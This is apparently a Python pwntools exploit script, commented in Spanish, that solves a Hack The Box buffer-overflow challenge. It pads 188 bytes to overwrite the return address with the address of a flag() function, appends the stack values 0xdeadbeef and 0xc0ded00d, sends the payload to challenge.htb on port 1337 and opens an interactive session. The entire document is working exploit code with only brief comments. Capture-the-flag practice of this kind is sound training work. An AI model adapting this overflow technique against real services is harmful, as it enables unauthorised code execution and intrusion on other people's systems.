from pwn import *

# Dirección de la función flag() encontrada en el binario
target_address = p64(0x08049182)  # Reemplazar con la dirección correcta

# Valores que deben coincidir con los comparadores en la pila
val1 = p32(0xdeadbeef)
val2 = p32(0xc0ded00d)

# Creación del payload
overflow = b"A" * 188  # Padding hasta el return address
payload = overflow + target_address + b"BBBB" + val1 + val2

# Conexión con la instancia de HTB
p = remote("challenge.htb", 1337)  # Reemplazar con la IP y puerto correctos
p.sendline(payload)
p.interactive()
